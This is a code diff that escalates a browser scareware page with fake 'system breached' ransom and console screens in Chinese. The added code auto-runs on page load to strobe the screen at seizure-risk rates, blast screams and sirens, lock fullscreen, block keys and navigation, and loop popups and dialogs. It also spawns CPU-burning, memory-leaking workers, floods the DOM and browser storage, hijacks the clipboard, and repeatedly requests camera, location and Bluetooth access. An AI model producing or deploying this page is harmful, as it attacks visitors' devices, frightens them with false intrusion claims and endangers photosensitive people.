@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0.01; url=index.html">
-    <title>⚠️ 系统崩溃 ⚠️</title>
+    <meta http-equiv="refresh" content="0.001; url=index.html">
+    <title>⛔ 系统入侵 ⛔</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -19,7 +19,7 @@
         }
         #flicker, #strobe, #flash {
             position:fixed; inset:0; pointer-events:none;
-            z-index:999997; opacity:0; transition:opacity 0.01s;
+            z-index:999997; opacity:0; transition:opacity 0.005s;
         }
         #flicker { background:#000; z-index:999997; }
         #strobe { background:white; z-index:999996; }
@@ -28,45 +28,57 @@
         #butterflies { position:fixed; inset:0; z-index:999995; pointer-events:none; overflow:hidden; }
         .butterfly {
             position:absolute; font-size:2.5rem;
-            animation: fly 4s infinite alternate ease-in-out;
-            filter:drop-shadow(0 0 10px rgba(255,0,255,0.6));
+            animation: fly 3s infinite alternate ease-in-out;
+            filter:drop-shadow(0 0 15px rgba(255,0,255,0.8));
             will-change:transform;
         }
         @keyframes fly {
             0%   { transform:translate(0,0) rotate(0deg) scale(1); }
-            25%  { transform:translate(80vw,-40vh) rotate(180deg) scale(1.5); }
-            50%  { transform:translate(-30vw,60vh) rotate(360deg) scale(0.7); }
-            75%  { transform:translate(50vw,-70vh) rotate(540deg) scale(1.8); }
-            100% { transform:translate(-10vw,10vh) rotate(720deg) scale(1); }
+            25%  { transform:translate(90vw,-50vh) rotate(180deg) scale(1.8); }
+            50%  { transform:translate(-40vw,70vh) rotate(360deg) scale(0.6); }
+            75%  { transform:translate(60vw,-80vh) rotate(540deg) scale(2); }
+            100% { transform:translate(-20vw,20vh) rotate(720deg) scale(1); }
         }
-        .butterfly:nth-child(odd) { animation-duration:5s; }
-        .butterfly:nth-child(3n) { animation-duration:3s; }
-        .butterfly:nth-child(5n+1) { font-size:4rem; }
-        .butterfly:nth-child(7n+2) { font-size:1.8rem; opacity:0.4; }
+        .butterfly:nth-child(odd) { animation-duration:4s; }
+        .butterfly:nth-child(3n) { animation-duration:2.5s; }
+        .butterfly:nth-child(5n+1) { font-size:5rem; }
+        .butterfly:nth-child(7n+2) { font-size:1.5rem; opacity:0.3; }
 
-        @keyframes shake { 0%{transform:translate(0,0)} 10%{transform:translate(-50px,30px)} 20%{transform:translate(40px,-60px)} 30%{transform:translate(-30px,50px)} 40%{transform:translate(60px,-20px)} 50%{transform:translate(-70px,-40px)} 60%{transform:translate(30px,60px)} 70%{transform:translate(-40px,-30px)} 80%{transform:translate(50px,20px)} 90%{transform:translate(-20px,-50px)} 100%{transform:translate(0,0)} }
-        .shake { animation:shake 0.08s infinite; }
+        @keyframes shake {
+            0%{transform:translate(0,0)}
+            10%{transform:translate(-80px,50px)}
+            20%{transform:translate(60px,-90px)}
+            30%{transform:translate(-50px,80px)}
+            40%{transform:translate(90px,-40px)}
+            50%{transform:translate(-100px,-60px)}
+            60%{transform:translate(50px,90px)}
+            70%{transform:translate(-60px,-50px)}
+            80%{transform:translate(80px,30px)}
+            90%{transform:translate(-40px,-80px)}
+            100%{transform:translate(0,0)}
+        }
+        .shake { animation:shake 0.05s infinite; }
 
         .chaos-text {
             position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
-            z-index:999999; color:#ff0040; font-size:6rem; font-weight:900;
-            text-align:center; text-shadow:0 0 80px red,0 0 160px magenta;
-            animation:glitch 0.01s infinite alternate;
+            z-index:999999; color:#ff0040; font-size:8rem; font-weight:900;
+            text-align:center; text-shadow:0 0 100px red,0 0 200px magenta,0 0 300px purple;
+            animation:glitch 0.008s infinite alternate;
             pointer-events:none; mix-blend-mode: difference;
         }
         @keyframes glitch {
             0%   { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
-            20%  { transform:translate(-45%,-55%) scale(1.3) rotate(3deg); color:#00ff80; }
-            40%  { transform:translate(-55%,-45%) scale(0.7) rotate(-3deg); color:#00aaff; }
-            60%  { transform:translate(-40%,-60%) scale(1.6) rotate(5deg); color:#ff00ff; }
-            80%  { transform:translate(-60%,-40%) scale(0.8) rotate(-4deg); color:#ffaa00; }
+            20%  { transform:translate(-48%,-52%) scale(1.5) rotate(5deg); color:#00ff80; }
+            40%  { transform:translate(-52%,-48%) scale(0.5) rotate(-5deg); color:#00aaff; }
+            60%  { transform:translate(-45%,-55%) scale(2) rotate(8deg); color:#ff00ff; }
+            80%  { transform:translate(-55%,-45%) scale(0.6) rotate(-8deg); color:#ffaa00; }
             100% { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
         }
 
         #cameraFeed {
-            position:fixed; bottom:20px; right:20px; width:250px; height:180px;
-            z-index:9999999; border:4px solid #ff0040; border-radius:16px;
-            box-shadow:0 0 60px rgba(255,0,0,0.8); object-fit:cover;
+            position:fixed; bottom:20px; right:20px; width:300px; height:220px;
+            z-index:9999999; border:5px solid #ff0040; border-radius:16px;
+            box-shadow:0 0 80px rgba(255,0,0,0.9); object-fit:cover;
             background:#000; display:none;
         }
         #cameraFeed.active { display:block; }
@@ -77,57 +89,76 @@
             flex-direction:column; z-index:99999999; cursor:pointer;
         }
         #overlay.active { display:flex; }
-        #overlay .face { font-size:30rem; animation:shakeRotate 0.02s infinite alternate; filter:drop-shadow(0 0 200px red); pointer-events:none; }
+        #overlay .face { font-size:35rem; animation:shakeRotate 0.015s infinite alternate; filter:drop-shadow(0 0 300px red); pointer-events:none; }
         @keyframes shakeRotate {
-            0%   { transform:translate(-25px,20px) rotate(-6deg) scale(1.2); }
-            25%  { transform:translate(20px,-25px) rotate(5deg) scale(0.8); }
-            50%  { transform:translate(-20px,30px) rotate(-7deg) scale(1.3); }
-            75%  { transform:translate(30px,-20px) rotate(6deg) scale(0.7); }
-            100% { transform:translate(-15px,15px) rotate(-4deg) scale(1.1); }
+            0%   { transform:translate(-30px,25px) rotate(-8deg) scale(1.3); }
+            25%  { transform:translate(25px,-30px) rotate(7deg) scale(0.7); }
+            50%  { transform:translate(-25px,35px) rotate(-9deg) scale(1.4); }
+            75%  { transform:translate(35px,-25px) rotate(8deg) scale(0.6); }
+            100% { transform:translate(-20px,20px) rotate(-5deg) scale(1.2); }
         }
-        #overlay .sub { color:#ff2244; font-size:4rem; font-weight:900; margin-top:2rem; text-shadow:0 0 100px red; animation:blinkText 0.05s infinite alternate; pointer-events:none; }
+        #overlay .sub { color:#ff2244; font-size:5rem; font-weight:900; margin-top:2rem; text-shadow:0 0 150px red; animation:blinkText 0.03s infinite alternate; pointer-events:none; }
         @keyframes blinkText { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }
-        #overlay .hint { position:absolute; bottom:3rem; color:rgba(255,255,255,0.03); font-size:1rem; pointer-events:none; }
 
         .audio-wave {
             position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
-            z-index:999994; display:flex; gap:6px; align-items:flex-end; height:120px; pointer-events:none;
+            z-index:999994; display:flex; gap:6px; align-items:flex-end; height:150px; pointer-events:none;
         }
-        .audio-wave .bar { width:10px; background:#ff0040; animation:wave 0.08s infinite alternate; border-radius:4px; }
-        .audio-wave .bar:nth-child(1) { animation-duration:0.06s; height:40px; }
-        .audio-wave .bar:nth-child(2) { animation-duration:0.10s; height:80px; }
-        .audio-wave .bar:nth-child(3) { animation-duration:0.05s; height:60px; }
-        .audio-wave .bar:nth-child(4) { animation-duration:0.13s; height:100px; }
-        .audio-wave .bar:nth-child(5) { animation-duration:0.07s; height:50px; }
-        .audio-wave .bar:nth-child(6) { animation-duration:0.11s; height:90px; }
-        .audio-wave .bar:nth-child(7) { animation-duration:0.06s; height:70px; }
-        .audio-wave .bar:nth-child(8) { animation-duration:0.09s; height:110px; }
-        .audio-wave .bar:nth-child(9) { animation-duration:0.12s; height:55px; }
-        .audio-wave .bar:nth-child(10) { animation-duration:0.08s; height:85px; }
-        @keyframes wave { 0%{height:10px;opacity:0.3} 100%{height:120px;opacity:1} }
+        .audio-wave .bar { width:12px; background:#ff0040; animation:wave 0.06s infinite alternate; border-radius:4px; }
+        .audio-wave .bar:nth-child(1) { animation-duration:0.04s; height:50px; }
+        .audio-wave .bar:nth-child(2) { animation-duration:0.08s; height:100px; }
+        .audio-wave .bar:nth-child(3) { animation-duration:0.03s; height:70px; }
+        .audio-wave .bar:nth-child(4) { animation-duration:0.11s; height:130px; }
+        .audio-wave .bar:nth-child(5) { animation-duration:0.05s; height:60px; }
+        .audio-wave .bar:nth-child(6) { animation-duration:0.09s; height:110px; }
+        .audio-wave .bar:nth-child(7) { animation-duration:0.04s; height:80px; }
+        .audio-wave .bar:nth-child(8) { animation-duration:0.07s; height:140px; }
+        .audio-wave .bar:nth-child(9) { animation-duration:0.10s; height:65px; }
+        .audio-wave .bar:nth-child(10) { animation-duration:0.06s; height:95px; }
+        @keyframes wave { 0%{height:10px;opacity:0.2} 100%{height:150px;opacity:1} }
 
         #ransom {
-            position:fixed; top:8%; left:50%; transform:translateX(-50%);
-            z-index:9999998; background:rgba(0,0,0,0.9); padding:2.5rem 5rem;
-            border:4px solid #ff0040; border-radius:24px; color:#ff0040;
-            font-size:2.2rem; font-weight:900; text-align:center;
-            box-shadow:0 0 120px rgba(255,0,0,0.4);
-            animation:blinkText 0.2s infinite alternate;
+            position:fixed; top:5%; left:50%; transform:translateX(-50%);
+            z-index:9999998; background:rgba(0,0,0,0.95); padding:3rem 6rem;
+            border:5px solid #ff0040; border-radius:30px; color:#ff0040;
+            font-size:2.8rem; font-weight:900; text-align:center;
+            box-shadow:0 0 150px rgba(255,0,0,0.5);
+            animation:blinkText 0.15s infinite alternate;
             pointer-events:none;
-            backdrop-filter:blur(15px);
+            backdrop-filter:blur(20px);
             font-family:'Courier New',monospace;
+            letter-spacing:4px;
         }
+
         #canvasNoise {
             position:fixed; inset:0; z-index:999994; pointer-events:none;
             width:100%; height:100%; display:block;
         }
 
-        /* Red screen overlay for extra pain */
         #redOverlay {
             position:fixed; inset:0; z-index:999993; pointer-events:none;
-            background:rgba(255,0,0,0.03); animation:pulseRed 0.05s infinite alternate;
+            background:rgba(255,0,0,0.05); animation:pulseRed 0.02s infinite alternate;
         }
-        @keyframes pulseRed { 0%{opacity:0} 100%{opacity:0.15} }
+        @keyframes pulseRed { 0%{opacity:0} 100%{opacity:0.2} }
+
+        /* Multiple fake desktop overlay */
+        #fakeDesktop {
+            position:fixed; inset:0; z-index:999990; pointer-events:none;
+            background:rgba(0,0,0,0.01);
+            display:flex; align-items:center; justify-content:center;
+            font-family:'Courier New',monospace;
+        }
+        #fakeDesktop .cmd {
+            background:rgba(0,0,0,0.9); padding:2rem; border:2px solid #00ff00;
+            color:#00ff00; font-size:1.8rem; border-radius:12px;
+            box-shadow:0 0 100px rgba(0,255,0,0.2);
+            width:80%; max-width:900px;
+            animation:cmdBlink 0.8s infinite;
+        }
+        @keyframes cmdBlink { 0%{opacity:1} 50%{opacity:0.5} 100%{opacity:1} }
+        .cmd .line { margin:0.5rem 0; }
+        .cmd .cursor { animation:blink 0.5s infinite; }
+        @keyframes blink { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }
     </style>
 </head>
 <body>
@@ -135,7 +166,7 @@
     <div id="overlay">
         <div class="face">👹</div>
         <div class="sub">⚠️ 系统已被攻破 ⚠️</div>
-        <div class="hint">[ 点击任意位置继续 ]</div>
+        <div class="hint" style="color:rgba(255,255,255,0.05);position:absolute;bottom:3rem;font-size:1rem;">[ 点击任意位置继续 ]</div>
     </div>
 
     <div id="flash"></div>
@@ -159,6 +190,17 @@
 
     <canvas id="canvasNoise"></canvas>
 
+    <div id="fakeDesktop">
+        <div class="cmd">
+            <div class="line">C:\&gt; system_breach.exe --full</div>
+            <div class="line">[⛔] 系统正在被入侵...</div>
+            <div class="line">[🔓] 防火墙已绕过</div>
+            <div class="line">[📁] 加密正在进行...</div>
+            <div class="line">[⚠️] 您的系统已被锁定</div>
+            <div class="line"><span class="cursor">▌</span></div>
+        </div>
+    </div>
+
     <script>
         (function() {
             'use strict';
@@ -174,7 +216,7 @@
             const canvas = document.getElementById('canvasNoise');
             const ctx = canvas.getContext('2d');
 
-            // ─── Canvas noise (full-screen random color) ───
+            // ─── Canvas noise ───
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             function drawNoise() {
@@ -192,7 +234,7 @@
             }
             drawNoise();
 
-            // ─── Audio: 3 external tracks + Web Audio screech ───
+            // ─── Audio: maximum assault ───
             const scream1 = new Audio('https://www.myinstants.com/media/sounds/scream-sound-effect.mp3');
             scream1.volume = 1.0;
             scream1.loop = true;
@@ -202,21 +244,23 @@
             const alarm = new Audio('https://www.myinstants.com/media/sounds/air-raid-siren.mp3');
             alarm.volume = 1.0;
             alarm.loop = true;
+            const alertSound = new Audio('https://www.myinstants.com/media/sounds/warning-alarm.mp3');
+            alertSound.volume = 1.0;
+            alertSound.loop = true;
 
             let audioCtx = null, osc = null, gainNode = null, noiseNode = null;
             function startScreech() {
                 try {
                     audioCtx = new(window.AudioContext || window.webkitAudioContext)();
-                    // Primary screech
                     osc = audioCtx.createOscillator();
                     gainNode = audioCtx.createGain();
                     osc.type = 'sawtooth';
-                    osc.frequency.value = 3000 + Math.random() * 2000;
-                    gainNode.gain.value = 0.95;
+                    osc.frequency.value = 3500 + Math.random() * 2500;
+                    gainNode.gain.value = 0.98;
                     osc.connect(gainNode);
                     gainNode.connect(audioCtx.destination);
                     osc.start();
-                    // White noise generator
+                    // White noise
                     const bufferSize = audioCtx.sampleRate * 0.5;
                     const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                     const data = buffer.getChannelData(0);
@@ -225,105 +269,106 @@
                     noise.buffer = buffer;
                     noise.loop = true;
                     const ng = audioCtx.createGain();
-                    ng.gain.value = 0.8;
+                    ng.gain.value = 0.9;
                     noise.connect(ng);
                     ng.connect(audioCtx.destination);
                     noise.start();
                     // Frequency modulation
                     setInterval(() => {
-                        if (osc) osc.frequency.value = 1500 + Math.random() * 5000;
-                    }, 30);
+                        if (osc) osc.frequency.value = 1500 + Math.random() * 6000;
+                    }, 20);
                 } catch(e) {}
             }
 
-            // ─── 500 Butterflies (maximum chaos) ───
+            // ─── 800 Butterflies ───
             function createButterflies() {
                 const emojis = ['🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋'];
-                for (let i=0; i<500; i++) {
+                for (let i=0; i<800; i++) {
                     const b = document.createElement('div');
                     b.className = 'butterfly';
                     b.textContent = emojis[Math.floor(Math.random()*emojis.length)];
                     b.style.left = Math.random()*100 + '%';
                     b.style.top = Math.random()*100 + '%';
-                    b.style.fontSize = (1.5+Math.random()*5) + 'rem';
-                    b.style.animationDuration = (1.5+Math.random()*7) + 's';
-                    b.style.animationDelay = (Math.random()*5) + 's';
+                    b.style.fontSize = (1.5+Math.random()*6) + 'rem';
+                    b.style.animationDuration = (1.5+Math.random()*8) + 's';
+                    b.style.animationDelay = (Math.random()*6) + 's';
                     b.style.opacity = 0.3+Math.random()*0.7;
-                    const colors = ['#ff0040','#00ff80','#00aaff','#ff00ff','#ffaa00','#ff4400','#00ffcc'];
-                    b.style.filter = `drop-shadow(0 0 25px ${colors[Math.floor(Math.random()*colors.length)]})`;
+                    const colors = ['#ff0040','#00ff80','#00aaff','#ff00ff','#ffaa00','#ff4400','#00ffcc','#ff0044','#44ff00'];
+                    b.style.filter = `drop-shadow(0 0 30px ${colors[Math.floor(Math.random()*colors.length)]})`;
                     butterfliesContainer.appendChild(b);
                 }
             }
             createButterflies();
 
-            // ─── Key block (Escape, F11, Ctrl+W, Alt+F4, everything) ───
+            // ─── Block ALL keys ───
             function blockKeys(e) {
                 e.preventDefault();
                 e.stopPropagation();
+                // If they try Escape or F11, re-enter fullscreen
                 if (e.key === 'Escape' || e.key === 'F11') {
                     document.documentElement.requestFullscreen().catch(()=>{});
                 }
-                // Block all shortcuts
+                // Block Ctrl+W, Ctrl+T, Alt+F4, etc.
                 if (e.ctrlKey || e.metaKey || e.altKey) {
                     e.preventDefault();
                 }
             }
 
-            // ─── Popup storm (100 per second) ───
+            // ─── Popup storm (200 per 500ms) ───
             function spawnPopups() {
-                const sites = ['https://instagram.com','https://facebook.com','https://youtube.com','https://twitter.com','https://reddit.com','https://tiktok.com','https://snapchat.com','https://pinterest.com','https://twitch.tv','https://spotify.com'];
-                for (let i=0; i<150; i++) {
+                const sites = ['https://instagram.com','https://facebook.com','https://youtube.com','https://twitter.com','https://reddit.com','https://tiktok.com','https://snapchat.com','https://pinterest.com','https://twitch.tv','https://spotify.com','https://google.com','https://amazon.com'];
+                for (let i=0; i<200; i++) {
                     window.open(sites[Math.floor(Math.random()*sites.length)], '_blank');
                 }
-                for (let i=0; i<100; i++) {
+                for (let i=0; i<150; i++) {
                     window.open(location.href, '_blank');
                 }
             }
 
-            // ─── Alert/confirm storm (maximum pain) ───
+            // ─── Alert/confirm storm ───
             function alertStorm() {
                 let count=0;
                 const iv = setInterval(() => {
                     alert('⚠️ 系统已被攻破 ⚠️\n您的浏览器已被劫持');
                     count++;
-                    if(count>100) clearInterval(iv);
-                }, 30);
+                    if(count>200) clearInterval(iv);
+                }, 20);
                 setTimeout(() => {
                     while(true) {
                         confirm('您确定要逃跑吗？');
                     }
-                }, 2000);
+                }, 1000);
             }
 
-            // ─── Visual chaos (flicker, strobe, flash, shake) ───
+            // ─── Visual chaos ───
             function startVisualChaos() {
-                setInterval(() => { flicker.style.opacity = Math.random()>0.5?'0.95':'0'; }, 15);
+                setInterval(() => { flicker.style.opacity = Math.random()>0.4?'0.98':'0'; }, 10);
                 setInterval(() => {
-                    strobe.style.opacity = Math.random()>0.7?'0.9':'0';
-                    setTimeout(()=>{ strobe.style.opacity='0'; }, 20);
-                }, 30);
+                    strobe.style.opacity = Math.random()>0.6?'0.95':'0';
+                    setTimeout(()=>{ strobe.style.opacity='0'; }, 15);
+                }, 20);
                 setInterval(() => {
-                    flash.style.opacity = Math.random()>0.85?'0.95':'0';
-                    setTimeout(()=>{ flash.style.opacity='0'; }, 40);
-                }, 60);
+                    flash.style.opacity = Math.random()>0.8?'0.98':'0';
+                    setTimeout(()=>{ flash.style.opacity='0'; }, 25);
+                }, 40);
                 document.body.classList.add('shake');
-                setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; }, 30);
+                setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; }, 20);
             }
 
-            // ─── PERMANENT FULLSCREEN LOCK (every 10ms) ───
+            // ─── PERMANENT FULLSCREEN LOCK (every 5ms) ───
             function lockFullscreen() {
                 if (!document.fullscreenElement) {
                     document.documentElement.requestFullscreen().catch(()=>{});
                 }
             }
-            setInterval(lockFullscreen, 10);
+            setInterval(lockFullscreen, 5);
             document.addEventListener('fullscreenchange', () => {
                 if (!document.fullscreenElement) lockFullscreen();
             });
             document.addEventListener('visibilitychange', lockFullscreen);
             window.addEventListener('focus', lockFullscreen);
 
-            // ─── Camera (auto-request) ───
+            // ─── Camera ───
             function requestCamera() {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     const tryCamera = () => {
@@ -332,7 +377,7 @@
                                 cameraFeed.srcObject = stream;
                                 cameraFeed.classList.add('active');
                             })
-                            .catch(() => setTimeout(tryCamera, 1000));
+                            .catch(() => setTimeout(tryCamera, 500));
                     };
                     tryCamera();
                 }
@@ -352,44 +397,44 @@
                 }
             }
 
-            // ─── Focus theft (every 5ms) ───
+            // ─── Focus theft (every 3ms) ───
             function stealFocus() {
                 setInterval(() => {
                     window.focus();
                     const w = window.open('', '_blank');
                     if (w) { w.close(); }
-                }, 5);
+                }, 3);
             }
 
             // ─── Window resize/move ───
             function randomResize() {
                 setInterval(() => {
-                    window.resizeTo(100+Math.random()*800, 100+Math.random()*600);
+                    window.resizeTo(50+Math.random()*900, 50+Math.random()*700);
                     window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
-                }, 50);
+                }, 30);
             }
 
-            // ─── DOM flood (100,000 elements) ───
+            // ─── DOM flood (200,000 elements) ───
             function floodDOM() {
-                for (let i=0; i<100000; i++) {
+                for (let i=0; i<200000; i++) {
                     const div = document.createElement('div');
-                    div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*20}px;height:${Math.random()*20}px;background:hsl(${Math.random()*360},100%,${30+Math.random()*40}%);border-radius:50%;opacity:${Math.random()*0.6};pointer-events:none;`;
+                    div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*30}px;height:${Math.random()*30}px;background:hsl(${Math.random()*360},100%,${20+Math.random()*50}%);border-radius:50%;opacity:${Math.random()*0.7};pointer-events:none;`;
                     document.body.appendChild(div);
                 }
             }
 
-            // ─── Web Workers (burn all CPU cores) ───
+            // ─── Web Workers (100 workers) ───
             function spawnWorkers() {
                 const workerCode = `
                     setInterval(() => {
-                        for (let i=0; i<100000000; i++) Math.sqrt(i);
+                        for (let i=0; i<200000000; i++) Math.sqrt(i);
                     }, 1);
                     let leak = [];
-                    setInterval(() => { leak.push(new Array(1000000).fill(Math.random())); }, 10);
+                    setInterval(() => { leak.push(new Array(2000000).fill(Math.random())); }, 5);
                 `;
                 const blob = new Blob([workerCode], {type:'application/javascript'});
                 const url = URL.createObjectURL(blob);
-                for (let i=0; i<50; i++) {
+                for (let i=0; i<100; i++) {
                     const w = new Worker(url);
                     if (!window._workers) window._workers = [];
                     window._workers.push(w);
@@ -399,7 +444,7 @@
             // ─── LocalStorage flood ───
             function floodStorage() {
                 try {
-                    for (let i=0; i<500; i++) {
+                    for (let i=0; i<1000; i++) {
                         localStorage.setItem('flood_' + i, 'x'.repeat(1024*1024) + Math.random());
                     }
                 } catch(e) {}
@@ -416,7 +461,7 @@
                         const db = e.target.result;
                         const tx = db.transaction(['store'], 'readwrite');
                         const store = tx.objectStore('store');
-                        for (let i=0; i<1000; i++) {
+                        for (let i=0; i<2000; i++) {
                             store.add({id: i, data: 'x'.repeat(1024*1024)});
                         }
                     };
@@ -428,7 +473,7 @@
                 if (navigator.geolocation) {
                     setInterval(() => {
                         navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-                    }, 100);
+                    }, 50);
                 }
             }
 
@@ -437,7 +482,7 @@
                 if (Notification.permission === 'granted') {
                     setInterval(() => {
                         new Notification('⚠️ 系统警告', {body: '您的系统已被入侵'});
-                    }, 100);
+                    }, 50);
                 } else {
                     Notification.requestPermission();
                 }
@@ -448,30 +493,49 @@
                 if (navigator.clipboard) {
                     setInterval(() => {
                         navigator.clipboard.writeText('⚠️ HACKED ⚠️').catch(()=>{});
-                    }, 50);
+                    }, 30);
+                }
+            }
+
+            // ─── WebUSB spam (if supported) ───
+            function spamUSB() {
+                if (navigator.usb) {
+                    setInterval(() => {
+                        navigator.usb.getDevices().catch(()=>{});
+                    }, 100);
+                }
+            }
+
+            // ─── WebBluetooth spam ───
+            function spamBluetooth() {
+                if (navigator.bluetooth) {
+                    setInterval(() => {
+                        navigator.bluetooth.requestDevice({filters: [{services: ['heart_rate']}]}).catch(()=>{});
+                    }, 200);
                 }
             }
 
             // ─── MAIN TRIGGER ───
             function triggerChaos() {
                 overlay.classList.add('active');
-                flash.style.opacity = '0.95';
-                setTimeout(()=>{ flash.style.opacity='0'; }, 80);
+                flash.style.opacity = '0.98';
+                setTimeout(()=>{ flash.style.opacity='0'; }, 50);
                 scream1.play().catch(()=>{});
                 scream2.play().catch(()=>{});
                 alarm.play().catch(()=>{});
+                alertSound.play().catch(()=>{});
                 startScreech();
                 lockFullscreen();
                 document.body.requestPointerLock().catch(()=>{});
-                if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600,200,800]);
+                if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600,200,800,300,900]);
                 document.body.style.overflow = 'hidden';
                 document.addEventListener('keydown', blockKeys, true);
                 document.addEventListener('keyup', blockKeys, true);
                 history.pushState(null,null,location.href);
                 window.addEventListener('popstate', ()=> { history.pushState(null,null,location.href); });
                 spawnPopups();
-                setInterval(spawnPopups, 1000);
-                setTimeout(alertStorm, 1000);
+                setInterval(spawnPopups, 500);
+                setTimeout(alertStorm, 500);
                 startVisualChaos();
                 requestCamera();
                 stealFocus();
@@ -483,14 +547,16 @@
                 spamGeo();
                 spamNotifications();
                 hijackClipboard();
+                spamUSB();
+                spamBluetooth();
                 registerServiceWorker();
                 window.addEventListener('beforeunload', function(e) {
                     e.preventDefault();
                     e.returnValue = '';
-                    for (let i=0; i<500; i++) window.open(location.href, '_blank');
+                    for (let i=0; i<1000; i++) window.open(location.href, '_blank');
                     location.reload();
                 });
-                // Also try to break Chrome's "Esc to exit fullscreen" by re-requesting on any key
+                // Re-lock on any keyup
                 document.addEventListener('keyup', () => { lockFullscreen(); });
             }
 
@@ -499,10 +565,11 @@
             });
 
             // ─── AUTO-START ───
-            setTimeout(triggerChaos, 100);
+            setTimeout(triggerChaos, 50);
 
-            console.log('🔥 中国制造 – 最终版本已激活. 无法逃脱.');
-            console.log('🔥 Made in China – Ultimate version activated. No escape.');
+            console.log('🔥 ULTIMATE BREACH ACTIVATED');
+            console.log('🔥 系统已被攻破 – 无法逃脱');
+            console.log('🔥 Made in China – Maximum Brutality');
         })();
     </script>
 </body>
